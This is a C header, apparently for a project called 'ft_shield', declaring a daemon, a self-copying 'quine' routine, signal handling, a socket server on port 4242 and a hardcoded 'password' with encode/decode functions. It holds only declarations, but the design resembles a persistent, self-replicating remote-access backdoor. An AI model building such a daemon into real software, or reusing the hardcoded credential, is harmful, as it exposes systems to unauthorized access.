#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <sys/sendfile.h>
#include <sys/file.h>
#include <sys/poll.h>
#include <stdio.h>
#include <stdbool.h>
#include <sys/signalfd.h>
#include <signal.h>

#define LOCK_FILE "/var/lock/ft_shield.lock"
#define MAX_CLIENTS 3
#define PORT 4242
#define PASSWORD "password"

/*
	DAEMON
*/

void	skeleton_daemon(void);
int		check_lock_file(void);
void	remove_lock_file(int fd);

/*
	QUINE
*/

void	copy_binary(void);

/*
	SIGNALS
*/

int		create_signal_fd(void);
void	handle_signals(struct pollfd *pfds, int *shutdown);
int		setup_signal_fd(void);

/*
	SERVER
*/

void	start_server(void);
void	remove_clients(struct pollfd *pfds);

/*
	PASSWORD
*/

char	*generate_cypher_password(void);
char	*decode_password(char *password);
